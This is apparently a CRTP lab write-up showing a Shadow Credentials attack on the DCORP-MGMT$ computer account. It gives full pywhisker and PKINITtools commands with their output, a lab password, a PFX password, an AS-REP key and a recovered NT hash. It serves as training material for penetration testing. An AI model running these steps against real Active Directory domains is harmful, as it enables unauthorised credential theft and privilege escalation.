#### Theory can be found in [[2. Domain Privilege Escalation#6. Shadow Credentials]] ####

- List existing KeyCredentials for `DCORP-MGMT`.
```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/MixedAttack/dollarcorp.moneycorp.local/pywhisker]
└─# python3 pywhisker.py -d dollarcorp.moneycorp.local -u ciadmin -p '*ContinuousIntrusion123' --target 'DCORP-MGMT$' --action list                  
[*] Searching for the target account
[*] Target user found: CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
[*] Attribute msDS-KeyCredentialLink is either empty or user does not have read permissions on that attribute
```

- Generate a KeyCredential structure and write the necessary information as new values of the `msDs-KeyCredentialLink` attribute of `DCORP-MGMT`.
```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/MixedAttack/dollarcorp.moneycorp.local/pywhisker]
└─# python3 pywhisker.py -d dollarcorp.moneycorp.local -u ciadmin -p '*ContinuousIntrusion123' --target 'DCORP-MGMT$' --action add --filename mgmt
[*] Searching for the target account
[*] Target user found: CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 9aba4ac2-4153-5004-20be-b3601b333f42
[*] Updating the msDS-KeyCredentialLink attribute of DCORP-MGMT$
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: mgmt.pfx
[*] Must be used with password: KmHdzwcmxs59MGadZbVo
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

- Request a TGT with `gettgtpkinit.py`.
```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/MixedAttack/dollarcorp.moneycorp.local/pywhisker]
└─# python3 ../PKINITtools/gettgtpkinit.py -cert-pfx mgmt.pfx -pfx-pass KmHdzwcmxs59MGadZbVo dollarcorp.moneycorp.local/'DCORP-MGMT$' mgmt.ccache 
2023-08-22 20:37:53,989 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2023-08-22 20:37:54,016 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2023-08-22 20:38:04,439 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2023-08-22 20:38:04,440 minikerberos INFO     9159e9151ba48d7a425a1fa97333f5ba8f27ecf9287fbfda66ea85b76a592a66
INFO:minikerberos:9159e9151ba48d7a425a1fa97333f5ba8f27ecf9287fbfda66ea85b76a592a66
2023-08-22 20:38:04,446 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

- Request a TGT using `getnthash.py`.
```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/MixedAttack/dollarcorp.moneycorp.local/pywhisker]
└─# export KRB5CCNAME=mgmt.ccache         


┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/MixedAttack/dollarcorp.moneycorp.local/pywhisker]
└─# python3 ../PKINITtools/getnthash.py -key 9159e9151ba48d7a425a1fa97333f5ba8f27ecf9287fbfda66ea85b76a592a66 dollarcorp.moneycorp.local/'DCORP-MGMT$'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
0878da540f45b31b974f73312c18e754
```

- With the NT hash of `DCORP-MGMT$` craft a TGS for `cifs/dcorp-mgmt.dollarcorp.moneycorp.local` to be able to dump hashes like in [[3. Linux Tools/dollarcorp.moneycorp.local/3. Domain Domination/Path 8 - RBCD|Path 8 - RBCD]]

- Clear the `msDs-KeyCredentialLink` attribute of `DCORP-MGMT`.
```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/MixedAttack/dollarcorp.moneycorp.local/pywhisker]
└─# python3 pywhisker.py -d dollarcorp.moneycorp.local -u ciadmin -p '*ContinuousIntrusion123' --target 'DCORP-MGMT$' --action clear                 
[*] Searching for the target account
[*] Target user found: CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
[*] Clearing the msDS-KeyCredentialLink attribute of DCORP-MGMT$
[+] msDS-KeyCredentialLink cleared successfully!
```